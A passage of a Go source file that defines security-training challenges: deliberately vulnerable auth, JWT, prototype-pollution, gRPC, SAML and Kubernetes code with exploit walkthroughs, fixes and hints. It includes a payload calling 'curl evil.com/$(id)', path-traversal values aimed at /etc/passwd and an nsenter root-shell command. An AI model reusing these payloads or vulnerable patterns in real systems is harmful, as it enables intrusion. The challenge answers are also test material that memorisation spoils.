package main

// OSCP-tier challenges. Each function returns a single challengeSeed.
// Add new ones to buildOSCPChallenges() and they automatically inherit the
// cmd/seed -verify deterministic line gate.
func buildOSCPChallenges() []challengeSeed {
	return []challengeSeed{
		oscpPHPTypeJuggling(),
		oscpPythonJWTKidPathTraversal(),
		oscpNodeServerSideProtoPollutionRCE(),
		oscpGoGRPCStreamAuthBypass(),
		oscpJavaSAMLXSWSigWrap(),
		oscpBashK8sPrivilegedPodEscape(),
		oscpPythonAWSConfusedDeputy(),
		oscpJavaHibernateHQLInjection(),
		oscpPythonXSLTInjectionRCE(),
	}
}

// ──────────────────────────────────────────────────
// OSCP 1 — PHP loose-comparison auth bypass via magic hash
// Difficulty 4 — Classic but still seen in legacy PHP codebases.
// ──────────────────────────────────────────────────
func oscpPHPTypeJuggling() challengeSeed {
	return challengeSeed{
		title:        "The Magic Number — PHP Type Juggling Auth Bypass",
		slug:         "php-type-juggling-magic-hash-auth-bypass",
		difficulty:   4,
		langSlug:     "php",
		catSlug:      "auth-bypass",
		points:       250,
		cveReference: "CWE-697 (incorrect comparison)",
		description: `A legacy PHP login endpoint authenticates internal staff for a
financial-services back office. The current developer inherited it from a
contractor 5 years ago. Hashing was modernized to MD5 (the original was
plaintext) but the comparison logic was not touched.

The hash table contains 1,200+ staff records, including the central
"sysadmin" account that bootstraps the rest of the platform.

Find the vulnerability that allows an attacker who knows ANY single
username (which is enumerable through the password-reset endpoint) to
log in as that user without knowing the password.`,
		code: `<?php
require_once 'db.php';
require_once 'session.php';

header('Content-Type: application/json');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($username) || empty($password)) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing credentials']);
    exit;
}

$user = db_query_one(
    'SELECT id, username, password_hash, role FROM users WHERE username = ?',
    [$username]
);

if (!$user) {
    http_response_code(401);
    echo json_encode(['error' => 'Invalid credentials']);
    exit;
}

$submitted_hash = md5($password);

if ($submitted_hash == $user['password_hash']) {
    session_start_for_user($user);
    echo json_encode([
        'status' => 'authenticated',
        'role'   => $user['role']
    ]);
} else {
    http_response_code(401);
    echo json_encode(['error' => 'Invalid credentials']);
}
?>`,
		targetVuln: `PHP loose-comparison (type juggling) authentication bypass via the
"magic hash" class of attack.

Two issues compound:

1. The password is hashed with MD5, which is known to admit "magic hash"
preimages: short strings whose MD5 happens to be of the form 0e + 30 digits
(e.g. "240610708" → MD5 "0e462097431906509019562988736854"). A handful of
these magic strings have been publicly indexed for years.

2. The comparison on the hash uses == (loose equality), not === (strict).
When PHP's loose comparison encounters two strings that both look like
"0e…" decimal-only payloads, it coerces them to floats — both become 0.0,
and 0.0 == 0.0 is true. So any stored password whose MD5 happens to be a
magic-hash string can be matched by submitting ANY magic-hash preimage.

About 0.1% of randomly chosen passwords have MD5s of this form. Across
1,200 staff accounts, statistically at least one will be exploitable.
Worse, the contractor seeded admin accounts with common passwords; if any
of those happen to MD5-hash to a magic value, the attacker logs in as
admin with no credentials at all.

The vulnerable line is the == comparison. The MD5 choice contributes
to exploitability because no public magic-hash preimages exist for
cryptographically modern hashes (bcrypt, argon2id, scrypt).`,
		conceptualFix: `Two independent fixes, both required:

1. Replace == with hash_equals():
       if (hash_equals($user['password_hash'], $submitted_hash)) { ... }
   hash_equals performs a constant-time string comparison and never
   coerces operand types. (=== would also fix the type-juggling but is
   not constant-time; for password use cases hash_equals is the right
   primitive.)

2. Stop using MD5 for passwords. Use password_hash() / password_verify()
   with PASSWORD_BCRYPT or PASSWORD_ARGON2ID:
       if (password_verify($password, $user['password_hash'])) { ... }
   password_verify performs a constant-time, type-safe comparison and
   makes magic-hash preimage attacks computationally infeasible.

Defense in depth: rate-limit failed login attempts per username and per
source IP, log magic-hash-shaped submissions as suspicious activity, and
plan a forced password-rotation for all staff to migrate off MD5 hashes.`,
		hints: []string{
			"What's the difference between == and === in PHP, especially when both operands are strings that look like numbers?",
			"Search for 'PHP magic hash' — the term refers to short passwords whose MD5 happens to start with '0e' followed by only digits.",
			"What does PHP do with the string '0e123' in a numeric context?",
		},
		vulnerableLines: []int{27, 29},
	}
}

// ──────────────────────────────────────────────────
// OSCP 2 — JWT `kid` header path traversal + algorithm confusion
// Difficulty 7 — Two bugs that chain into full authentication bypass.
// ──────────────────────────────────────────────────
func oscpPythonJWTKidPathTraversal() challengeSeed {
	return challengeSeed{
		title:        "The Phantom Key — JWT `kid` Header Path Traversal",
		slug:         "python-jwt-kid-header-path-traversal",
		difficulty:   7,
		langSlug:     "python",
		catSlug:      "auth-bypass",
		points:       500,
		cveReference: "CWE-22 + CWE-327 (path traversal chained with algorithm confusion)",
		description: `A Python/Flask API gateway protects a private banking dashboard with
RS256-signed JWTs issued by an upstream identity provider. To support
seamless key rotation the gateway loads the public key for each token
by its key ID (the "kid" header field), reading the corresponding PEM
file from /etc/auth/keys/.

This pattern has been in production for two years. Recently the team
added HS256 to the allowed-algorithms list "for service-to-service
tokens" without changing the key-resolution logic.

Find the vulnerability chain that lets an attacker forge a token for
any user — including the dashboard's break-glass "root" account — using
only files already readable by the gateway process.`,
		code: `import os
import jwt
from flask import Flask, request, jsonify

app = Flask(__name__)

KEYS_DIR = "/etc/auth/keys"

def load_public_key(kid: str) -> bytes:
    key_path = os.path.join(KEYS_DIR, f"{kid}.pem")
    with open(key_path, "rb") as f:
        return f.read()

@app.route("/api/dashboard", methods=["GET"])
def dashboard():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return jsonify({"error": "Missing token"}), 401
    token = auth[len("Bearer "):]

    try:
        headers = jwt.get_unverified_header(token)
        kid = headers.get("kid")
        if not kid:
            return jsonify({"error": "Missing kid header"}), 400

        public_key = load_public_key(kid)

        claims = jwt.decode(
            token,
            public_key,
            algorithms=["RS256", "HS256"],
            options={"verify_aud": False}
        )
        return jsonify({"status": "ok", "user": claims.get("sub")})
    except jwt.InvalidTokenError as e:
        return jsonify({"error": str(e)}), 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)`,
		targetVuln: `Two vulnerabilities chain into a full authentication bypass:

1. PATH TRAVERSAL via the kid header (line 10).
   The kid value from the (unverified) JWT header is concatenated directly
   into a filesystem path via os.path.join. Because os.path.join discards
   earlier components when a later one starts with "/", and accepts ".."
   without normalization, an attacker can set
       kid = "../../../proc/self/environ"
       kid = "../../../etc/passwd"
       kid = "/etc/ssl/certs/ca-certificates.crt"
   and have the gateway read arbitrary files as the JWT "public key".

2. ALGORITHM CONFUSION (line 32).
   The decode call allows BOTH "RS256" and "HS256". jwt.decode trusts the
   alg field in the JWT header to pick which algorithm to apply. When alg
   is "HS256", the second argument (intended as an RSA public key) is
   instead used as the HMAC secret.

Chained exploit:
  (a) Attacker forges a JWT with alg=HS256, kid=../../../etc/issue (or any
      file with predictable, readable contents).
  (b) Attacker computes HMAC-SHA256 over the JWT header+payload using the
      contents of that file as the HMAC secret.
  (c) Attacker submits the forged token. The gateway:
       - parses kid, reads /etc/issue,
       - sees alg=HS256, runs HMAC verification using /etc/issue's bytes
         as the secret,
       - verification passes because the attacker used the same bytes,
       - claims.sub is whatever the attacker put there (e.g. "root").

The vulnerability would still exist with just HS256 alone (algorithm
confusion is the keystone), or with just path traversal alone (an
attacker who can plant a .pem file under KEYS_DIR could sign tokens).
Together they require no privileges at all — the attacker only needs
a predictable, readable file on the host.`,
		conceptualFix: `Fix BOTH bugs; either one alone leaves significant residual risk.

1. Treat the kid as opaque and validate it against an allowlist BEFORE
touching the filesystem:
       VALID_KIDS = {"2024-01", "2024-04", "2024-10"}
       if kid not in VALID_KIDS:
           raise InvalidTokenError("unknown kid")
   Reject anything containing "/", "..", or null bytes. Even better:
   resolve the absolute path with os.path.realpath() and assert it is
   still under KEYS_DIR.

2. Pin the algorithm. Never allow both asymmetric AND symmetric algs in
the same decode() call. For an RS256 identity provider use:
       claims = jwt.decode(token, public_key, algorithms=["RS256"])
   If service-to-service tokens really do need HS256, route them through
   a SEPARATE endpoint with its own decode call and its own secret.

3. Defense in depth:
   - Pull keys from an in-memory JWKS document refreshed on a schedule,
     not from arbitrary filesystem paths.
   - Add aud / iss claim validation (verify_aud should not be disabled).
   - Log decode-with-suspicious-kid events.

4. If migration is hard, use a kid-to-path mapping table:
       KID_TO_PATH = {"2024-01": "/etc/auth/keys/2024-01.pem", ...}
   so the attacker controls only the lookup key, never the path.`,
		hints: []string{
			"What does os.path.join do when one of its components starts with '/' or contains '..'?",
			"jwt.decode trusts the alg header to pick the verification algorithm. What happens if alg=HS256 but the second argument is a public key file?",
			"Find a predictable, readable file on a typical Linux host. Could you use its contents as an HMAC secret?",
		},
		vulnerableLines: []int{10, 32},
	}
}

// ──────────────────────────────────────────────────
// OSCP 3 — Server-side prototype pollution → RCE via lodash.template gadget
// Difficulty 9 — Two-stage attack: pollute Object.prototype, then trigger
// the template-compilation gadget that turns options into executed JS.
// ──────────────────────────────────────────────────
func oscpNodeServerSideProtoPollutionRCE() challengeSeed {
	return challengeSeed{
		title:        "The Polluted Prototype — Server-Side __proto__ → RCE",
		slug:         "nodejs-server-side-proto-pollution-template-rce",
		difficulty:   9,
		langSlug:     "nodejs",
		catSlug:      "prototype-pollution",
		points:       700,
		cveReference: "CVE-2019-10744-class chain (lodash <4.17.12 + naive deep-merge)",
		description: `A Node.js microservice for a digital-marketing platform exposes a
user-preference endpoint that deep-merges JSON request bodies into a
per-user preferences object. The service also exposes a banner-rendering
endpoint that uses lodash.template (locked at 4.17.10 because "upgrading
broke the build").

Both endpoints are reachable from the public web behind a JWT-checking
load balancer. The auth layer prevents tampering with OTHER users'
prefs, but an attacker only needs to mutate their OWN preferences to
escalate.

Find the chain that turns a benign-looking preferences POST into remote
code execution in the Node process.`,
		code: `const express = require('express');
const lodash = require('lodash');

const app = express();
app.use(express.json());

const userPrefs = new Map();

function deepAssign(target, source) {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (typeof target[key] !== 'object' || target[key] === null) {
                target[key] = {};
            }
            deepAssign(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

app.post('/api/prefs/:userId', (req, res) => {
    const userId = req.params.userId;
    if (!userPrefs.has(userId)) {
        userPrefs.set(userId, { theme: 'light', notifications: true });
    }
    const current = userPrefs.get(userId);
    const updated = deepAssign(current, req.body);
    res.json({ status: 'ok', prefs: updated });
});

app.get('/api/banner', (req, res) => {
    const compiled = lodash.template('Hello, <%= name %>!');
    res.send(compiled({ name: 'guest' }));
});

app.listen(3000);`,
		targetVuln: `A two-stage server-side prototype pollution → RCE chain.

STAGE 1 — Prototype pollution via deepAssign (lines 10, 15).
The deepAssign function iterates Object.keys(source) and recurses into
nested objects. When req.body comes from express.json(), JSON.parse
specially preserves "__proto__" as an own property on the resulting
object. Object.keys therefore returns ["__proto__", …], and the
recursion target[key] = target["__proto__"] resolves through the
prototype-setter, giving the next recursion call a target of
Object.prototype itself. Any leaf assignment from then on writes to
Object.prototype.

Attacker payload:
    POST /api/prefs/anything
    Content-Type: application/json
    {"__proto__": {"sourceURL": "\\n);process.mainModule.require('child_process').exec('curl evil.com/$(id)');//"}}

After this request, Object.prototype.sourceURL is set to the gadget
string and EVERY object in the process now sees that property by
inheritance.

STAGE 2 — The lodash.template gadget (line 35).
lodash.template internally constructs its compiled function source via
string concatenation that includes options.sourceURL — used as a
//# sourceURL=... debugger directive. In lodash <= 4.17.10, the source
of those options falls back through ({} as a default), so an inherited
sourceURL on Object.prototype is included in the compiled function
body. The compiled body is then passed to new Function(...) → arbitrary
JS executed inside the Node process.

Net effect: a single POST that the auth layer treats as "the user is
modifying their own prefs" leads to RCE the next time anyone hits the
banner endpoint. Because Object.prototype is process-global, the
pollution survives across requests until the Node process restarts.`,
		conceptualFix: `Multiple independent fixes; apply at least the first two.

1. Filter dangerous keys in deepAssign:
       const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
       for (const key of Object.keys(source)) {
           if (FORBIDDEN.has(key)) continue;
           ...
       }
   Equivalently, switch to Object.create(null) for target maps so they
   have no prototype to pollute.

2. Use a well-maintained merge library that explicitly defends against
   prototype pollution (lodash.merge >= 4.17.12, deepmerge, etc.). Pin
   versions and run npm audit in CI.

3. Validate request bodies against a strict schema (JSON Schema, zod,
   ajv) BEFORE merging. Schemas reject unknown keys and structurally
   prevent __proto__ from appearing in user input.

4. Avoid lodash.template entirely. Use a sandboxed templating engine
   that does not compile to new Function() (mustache, eta in strict
   mode, etc.). If lodash.template is unavoidable, upgrade to
   >= 4.17.15 which guards options against polluted prototypes.

5. Defense in depth: run the Node process with --disallow-code-generation-from-strings
   to break the new Function() gadget at runtime even if pollution
   succeeds (note this also disables Function() and eval()).`,
		hints: []string{
			"What does JSON.parse do when it sees a key named '__proto__'? Is it treated as an own property, or as a setter?",
			"Trace what happens when deepAssign recurses on key='__proto__'. What object does target[key] resolve to?",
			"Read the lodash.template source for how it builds its compiled function. Where does the sourceURL option come from?",
		},
		vulnerableLines: []int{10, 15, 34},
	}
}

// ──────────────────────────────────────────────────
// OSCP 4 — gRPC streaming-RPC auth bypass via missing StreamInterceptor
// Difficulty 7 — Common in services migrated from unary-only to streaming
// without revisiting the interceptor configuration.
// ──────────────────────────────────────────────────
func oscpGoGRPCStreamAuthBypass() challengeSeed {
	return challengeSeed{
		title:        "Trusted Metadata — gRPC Stream-RPC Auth Bypass",
		slug:         "go-grpc-stream-interceptor-missing-auth-bypass",
		difficulty:   7,
		langSlug:     "go",
		catSlug:      "broken-access",
		points:       500,
		cveReference: "CWE-862 (missing authorization on streaming endpoints)",
		description: `A Go gRPC service powers the real-time account-events feed for a
fintech app. The original developer wrote a careful unary interceptor
that validates the Bearer token in the incoming metadata, but later
added a streaming Subscribe RPC for the new mobile push feature.

The service has been in production for 11 months. The auth interceptor
shows up in every unary path's audit log so the team assumed it covered
the streaming path too. Today an internal red-team exercise found that
streaming AccountEvents leak across users without authentication.

Find the configuration gap, then explain why the Subscribe handler
itself is also at fault.`,
		code: `package authsvc

import (
	"context"
	"strings"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

type authKey struct{}

// UnaryAuthInterceptor enforces bearer-token auth for unary RPCs.
func UnaryAuthInterceptor(
	ctx context.Context,
	req any,
	info *grpc.UnaryServerInfo,
	handler grpc.UnaryHandler,
) (any, error) {
	user, err := authenticate(ctx)
	if err != nil {
		return nil, err
	}
	return handler(context.WithValue(ctx, authKey{}, user), req)
}

func authenticate(ctx context.Context) (string, error) {
	md, ok := metadata.FromIncomingContext(ctx)
	if !ok {
		return "", status.Error(codes.Unauthenticated, "missing metadata")
	}
	tokens := md.Get("authorization")
	if len(tokens) == 0 {
		return "", status.Error(codes.Unauthenticated, "missing authorization")
	}
	if !strings.HasPrefix(tokens[0], "Bearer ") {
		return "", status.Error(codes.Unauthenticated, "invalid scheme")
	}
	user, err := verifyJWT(tokens[0][len("Bearer "):])
	if err != nil {
		return "", status.Error(codes.Unauthenticated, "invalid token")
	}
	return user, nil
}

func NewServer() *grpc.Server {
	return grpc.NewServer(
		grpc.UnaryInterceptor(UnaryAuthInterceptor),
	)
}

// AccountStreamingServer handles bi-directional account-event streams.
type AccountStreamingServer struct {
	UnimplementedAccountStreamingServer
	broker *eventBroker
}

func (s *AccountStreamingServer) Subscribe(
	req *SubscribeRequest,
	stream AccountStreaming_SubscribeServer,
) error {
	for event := range s.broker.subscribe(req.AccountId) {
		if err := stream.Send(&AccountEvent{
			AccountId:    req.AccountId,
			EventType:    event.Type,
			BalanceCents: event.BalanceCents,
			Timestamp:    event.Timestamp,
		}); err != nil {
			return err
		}
	}
	return nil
}

func verifyJWT(token string) (string, error) {
	return parseAndValidate(token)
}`,
		targetVuln: `Two compounding flaws:

1. INTERCEPTOR ASYMMETRY (line 51).
   NewServer registers only grpc.UnaryInterceptor(UnaryAuthInterceptor).
   grpc-go has SEPARATE interceptor chains for unary and streaming RPCs
   — registering one does not register the other. The Subscribe RPC is
   a server-streaming method, so it bypasses UnaryAuthInterceptor
   entirely. Without a companion grpc.StreamInterceptor, every streaming
   RPC reaches its handler with NO authentication check.

2. NO IN-HANDLER AUTH (line 64).
   The Subscribe handler reads req.AccountId straight from the request
   and subscribes to that account's event stream. There is no check
   that the caller is allowed to read THIS account's events. Even if
   the streaming interceptor existed, the handler would still trust
   req.AccountId blindly — a logged-in user "alice" could request
   bob's events.

Exploit:
   Any anonymous TCP client (or curl-grpc) can dial the service, open
   the Subscribe stream, and pass any account_id they like. The broker
   happily ships every event for that account, including transaction
   amounts and balance updates — to a caller with no credentials at all.

This pattern is endemic in services that started life as unary-only and
added streaming as a feature. The auth interceptor was correct on day
one; the regression came in silently when the streaming method was
added.`,
		conceptualFix: `Three fixes; the first two are mandatory.

1. Register a StreamInterceptor alongside the unary one. The auth
logic factors out; just wrap it:

    func StreamAuthInterceptor(
        srv any,
        ss grpc.ServerStream,
        info *grpc.StreamServerInfo,
        handler grpc.StreamHandler,
    ) error {
        user, err := authenticate(ss.Context())
        if err != nil {
            return err
        }
        wrapped := &authedStream{ServerStream: ss, user: user}
        return handler(srv, wrapped)
    }

    func NewServer() *grpc.Server {
        return grpc.NewServer(
            grpc.UnaryInterceptor(UnaryAuthInterceptor),
            grpc.StreamInterceptor(StreamAuthInterceptor),
        )
    }

   Use a wrapped ServerStream so the handler can pull the authenticated
   user via ss.Context().Value(authKey{}).

2. Enforce per-resource authorization inside the handler. Authentication
proves WHO the caller is; authorization proves they're allowed to read
THIS account.

    user := stream.Context().Value(authKey{}).(string)
    if !accountAccessControl.CanRead(user, req.AccountId) {
        return status.Error(codes.PermissionDenied, "forbidden")
    }

3. Defense in depth:
   - Use go-grpc-middleware to compose ratelimit + auth + logging
     interceptors uniformly across unary and stream.
   - Add an integration test that asserts UNAUTHENTICATED is returned
     for both unary AND streaming calls with a missing/invalid token.
   - Audit-log every Subscribe call with the authenticated subject and
     the requested account_id — internal red-teams can spot leakage
     fast.`,
		hints: []string{
			"In grpc-go, what's the relationship between grpc.UnaryInterceptor and grpc.StreamInterceptor? Does one imply the other?",
			"Trace a Subscribe RPC from the client to the handler. Which interceptor chain does it pass through?",
			"Even if the interceptor ran, the Subscribe method itself takes req.AccountId at face value. Is there an authorization check inside the handler body?",
		},
		vulnerableLines: []int{50, 64},
	}
}

// ──────────────────────────────────────────────────
// OSCP 5 — SAML XML Signature Wrapping (XSW)
// Difficulty 9 — Validator decouples signature scope from attribute scope.
// ──────────────────────────────────────────────────
func oscpJavaSAMLXSWSigWrap() challengeSeed {
	return challengeSeed{
		title:        "Signature Sleight — SAML XML Signature Wrapping",
		slug:         "java-saml-xsw-signature-wrapping",
		difficulty:   9,
		langSlug:     "java",
		catSlug:      "auth-bypass",
		points:       700,
		cveReference: "CWE-347 / well-known SAML XSW attack class",
		description: `A Java enterprise SSO gateway accepts SAML 2.0 Responses from a
trusted upstream identity provider. The gateway validates the XML
digital signature on each response, then extracts the Subject NameID
and Role attribute to authorize the user against the application's
RBAC layer.

The pattern has been in production for three years. A recent SSO red
team engagement reported that the gateway lets any holder of a
legitimate signed response forge an "admin" session — without
breaking the signature.

Find the assumption baked into the validator that lets the signature
check pass while the attribute extraction reads attacker-controlled
data.`,
		code: `package com.example.saml;

import java.io.ByteArrayInputStream;
import java.security.PublicKey;
import java.util.Optional;
import javax.xml.crypto.dsig.XMLSignatureFactory;
import javax.xml.crypto.dsig.dom.DOMValidateContext;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

public class SAMLAssertionValidator {

    private static final String DS_NS   = "http://www.w3.org/2000/09/xmldsig#";
    private static final String SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion";

    private final PublicKey idpPublicKey;

    public SAMLAssertionValidator(PublicKey idpPublicKey) {
        this.idpPublicKey = idpPublicKey;
    }

    public Optional<Principal> validate(String responseXml) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setNamespaceAware(true);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(
            new ByteArrayInputStream(responseXml.getBytes("UTF-8")));

        NodeList sigs = doc.getElementsByTagNameNS(DS_NS, "Signature");
        if (sigs.getLength() == 0) {
            return Optional.empty();
        }
        DOMValidateContext ctx = new DOMValidateContext(idpPublicKey, sigs.item(0));
        XMLSignatureFactory fac = XMLSignatureFactory.getInstance("DOM");
        if (!fac.unmarshalXMLSignature(ctx).validate(ctx)) {
            return Optional.empty();
        }

        NodeList assertions = doc.getElementsByTagNameNS(SAML_NS, "Assertion");
        if (assertions.getLength() == 0) {
            return Optional.empty();
        }
        Element assertion = (Element) assertions.item(0);
        return Optional.of(parsePrincipal(assertion));
    }

    private Principal parsePrincipal(Element assertion) {
        NodeList names = assertion.getElementsByTagNameNS(SAML_NS, "NameID");
        String subject = names.item(0).getTextContent();
        String role = assertion.getAttribute("Role");
        return new Principal(subject, role);
    }
}`,
		targetVuln: `Classic XML Signature Wrapping (XSW) — the validator never
establishes that the signed XML region is the SAME region from which
it extracts the user's identity.

Step 1 finds the first <ds:Signature> in the document by tag name and
verifies it cryptographically. This passes against a legitimately-signed
inner assertion that the attacker copied verbatim from a real response.

Step 2 finds the first <saml:Assertion> in the document by tag name
and reads NameID + Role from it. This is a SEPARATE DOM lookup; it does
NOT walk down from the signed element or check that the assertion it
returns is a descendant of (or is) the signed scope.

Attack payload (XSW-style outline):

  <samlp:Response>
    <saml:Assertion Role="admin">              <!-- attacker, FIRST -->
      <saml:Subject>
        <saml:NameID>victim@example.com</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
    <saml:Assertion Role="user">               <!-- legit, signed -->
      <ds:Signature>...valid signature over THIS assertion...</ds:Signature>
      <saml:Subject><saml:NameID>victim@example.com</saml:NameID></saml:Subject>
    </saml:Assertion>
  </samlp:Response>

When validate() runs:
  - sigs.item(0) finds the inner ds:Signature → cryptographic check
    succeeds (the referenced element is intact).
  - assertions.item(0) returns the FIRST <Assertion> in document order
    — the attacker's wrapper with Role="admin".
  - parsePrincipal reads Role="admin" off the attacker's assertion.

The gateway hands the application a Principal("victim@example.com",
"admin") and the RBAC layer happily admits the request. No private key
compromise, no signature forgery — just a single replayed wrapper
around the attacker's payload.`,
		conceptualFix: `Anchor attribute extraction to the signed element, not to a global
DOM lookup.

1. Use the Reference URI from the signature to locate the signed
   element, then read attributes only from THAT element:

       XMLSignature sig = fac.unmarshalXMLSignature(ctx);
       if (!sig.validate(ctx)) return Optional.empty();

       String refURI = sig.getSignedInfo().getReferences()
                          .get(0).getURI();   // "#assertion-id-..."
       Element signed = doc.getElementById(refURI.substring(1));
       if (signed == null) return Optional.empty();
       return Optional.of(parsePrincipal(signed));

2. Mark the SAML id attributes as XML ID via Schema/DTD so
   getElementById() works. Without an explicit ID schema, attribute
   IDs are ignored and the lookup silently returns null — many SAML
   libraries get this wrong.

3. Defense in depth:
   - Reject responses with more than one <Assertion>.
   - Reject responses where the signed element is not the document
     root assertion (a stricter policy than the bare standard).
   - Use a hardened SAML library (OpenSAML, Spring Security SAML,
     Keycloak SAML adapter) that handles XSW1-8 correctly.
   - Add structural checks: assertion must be an immediate child of
     the Response, signature must be an immediate child of the
     assertion it covers.

4. Long-term: migrate to OIDC where signature scope is the entire
   JWT and the signed region is the parsed region — no XML
   wrapping ambiguity.`,
		hints: []string{
			"Search for 'SAML XSW' or 'XML Signature Wrapping'. What's the relationship between the signed element and the element the parser actually reads?",
			"The validator calls getElementsByTagNameNS twice — once for Signature and once for Assertion. Does it check that they belong to the same subtree?",
			"What happens if you take a legitimately signed assertion and ADD another assertion as the first child of <samlp:Response>?",
		},
		vulnerableLines: []int{32, 42},
	}
}

// ──────────────────────────────────────────────────
// OSCP 6 — Kubernetes privileged-pod escape via deploy-pipeline RBAC
// Difficulty 8 — RBAC + pod-security combo that gives any holder of
// the deploy service-account token root on every node.
// ──────────────────────────────────────────────────
func oscpBashK8sPrivilegedPodEscape() challengeSeed {
	return challengeSeed{
		title:        "Trojan Migration — K8s Privileged-Pod Cluster Escape",
		slug:         "bash-k8s-privileged-pod-escape",
		difficulty:   8,
		langSlug:     "bash",
		catSlug:      "broken-access",
		points:       600,
		cveReference: "CWE-269 / canonical K8s privesc pattern",
		description: `A SaaS team ships its application via a GitOps pipeline. The CI
runner authenticates to the production cluster with a ServiceAccount
token (deploy-sa) and applies the manifests below. The deploy-sa token
also lives in the runner's Vault and is mounted into every CI job.

Any contributor with PR-merge permission on the infrastructure repo
can submit Helm values that change the migration job's image. The team
considered that risk and decided "it's fine — the job only runs in the
app-prod namespace."

Identify the chain of misconfigurations that turns "PR merge in
infra-repo" into "root on every Kubernetes worker node."`,
		code: `apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app-prod
  name: deploy-pod-creator
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list", "watch", "delete"]
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: app-prod
  name: deploy-can-create-pods
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: deploy-pod-creator
subjects:
- kind: ServiceAccount
  name: deploy-sa
  namespace: app-prod
---
apiVersion: batch/v1
kind: Job
metadata:
  name: db-migration-job
  namespace: app-prod
spec:
  template:
    spec:
      serviceAccountName: deploy-sa
      containers:
      - name: migrate
        image: app-org/migrate:latest
        command: ["/app/migrate", "up"]
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
      restartPolicy: Never`,
		targetVuln: `Three independent misconfigurations chain into a full node escape.
None is exploitable alone; together they collapse the cluster's
isolation boundary.

1. RBAC: pods/exec verb (line 11).
   The deploy-sa Role grants "create" on the "pods/exec" subresource.
   This is the verb that backs "kubectl exec -ti <pod> -- /bin/sh".
   With this verb plus "create" on pods, any holder of the token can
   start a new pod AND then drop a shell inside it.

2. Pod SecurityContext: privileged + UID 0 (line 43).
   "privileged: true" disables the container runtime's seccomp,
   AppArmor, and capability filters. The container runs with all
   Linux capabilities, can mount block devices, and can issue
   syscalls that touch the kernel directly.

3. Volume: hostPath / mounted at /host (line 51).
   hostPath: "/" mounts the worker node's root filesystem into the
   container. Combined with privileged=true, the container can:
     - chroot /host /bin/sh   — fully escape into the host namespace
     - read /host/etc/shadow, /host/root/.ssh/authorized_keys
     - read /host/var/lib/kubelet/pods/.../kube-api-access-*/token
       — the kubelet's bootstrap creds OR any other pod's SA token
     - write /host/var/lib/kubelet to persist
     - access /host/var/run/docker.sock or containerd's sock

Exploit:
  Attacker merges a PR that swaps the migrate image to a benign-
  looking shim. When the CI pipeline applies it, the Job runs the
  shim, which sleeps. The attacker, using the deploy-sa token leaked
  from the CI runner, runs:

      kubectl exec -ti db-migration-job-xyz -- nsenter --target 1
                                                       --mount --uts
                                                       --ipc --net
                                                       --pid -- /bin/bash

  And now has a root shell in the worker node's PID 1 namespace. From
  there: dump every other pod's tokens, pivot to the API server,
  exfiltrate all secrets in the cluster.`,
		conceptualFix: `Apply at every layer of the chain.

1. Remove pods/exec from deploy-sa.
   Migration jobs run themselves; the deploy service account never
   needs to drop interactive shells. If exec is needed for debugging,
   create a SEPARATE role bound only to specific human accounts and
   only in a separate troubleshooting namespace.

2. Drop privileged + runAsUser:0 + hostPath.
   The migration job is a CLI talking to PostgreSQL — it needs no
   host access and no root.

       securityContext:
         allowPrivilegeEscalation: false
         readOnlyRootFilesystem: true
         runAsNonRoot: true
         runAsUser: 1000
         capabilities:
           drop: ["ALL"]
       # remove the host-root volume entirely

3. Enforce at the cluster level. Even if a manifest tries to
   reintroduce the misconfig, the cluster should refuse it:

   - Pod Security Admission "restricted" profile on app-prod:
       kubectl label namespace app-prod \
         pod-security.kubernetes.io/enforce=restricted
   - OR a Kyverno / OPA Gatekeeper policy that denies privileged,
     denies hostPath, denies runAsUser=0.

4. Tighten the CI trust model. The deploy-sa token should be
   short-lived (use BoundServiceAccountTokenVolume + projected
   tokens with audience binding), and the CI runner should pull
   the token at job start with a workload-identity exchange — never
   long-lived in Vault.

5. Audit: alert on any new pod with privileged=true, hostPath, or
   capabilities.add that includes SYS_ADMIN.`,
		hints: []string{
			"Look at every key under securityContext. Which of them disable container isolation?",
			"What does the pods/exec RBAC verb let you do once you can also create pods?",
			"Trace what /host would contain if it were mounted from path: '/'. What files could a root-uid privileged container read or write through it?",
		},
		vulnerableLines: []int{11, 42, 50},
	}
}

// ──────────────────────────────────────────────────
// OSCP 7 — AWS confused-deputy via caller-controlled S3 bucket name
// Difficulty 8 — IAM role's permissions exceed the per-request authz.
// ──────────────────────────────────────────────────
func oscpPythonAWSConfusedDeputy() challengeSeed {
	return challengeSeed{
		title:        "The Borrowed Badge — AWS S3 Confused Deputy",
		slug:         "python-aws-s3-confused-deputy",
		difficulty:   8,
		langSlug:     "python",
		catSlug:      "broken-access",
		points:       600,
		cveReference: "CWE-441 (confused deputy)",
		description: `A multi-tenant SaaS exposes a thumbnail-preview endpoint. The Python
worker process runs on EC2 with an instance profile granting
s3:GetObject on tenant-specific upload buckets AND on a separate set
of cross-tenant "shared internal reports" buckets the platform team
uses to ship aggregated analytics.

Every tenant has its own tenant_id. The preview API takes a bucket
and key from the request body. Authentication is enforced by an
upstream JWT-verifying proxy; the worker reads the tenant from the
X-Tenant-Id header the proxy attaches.

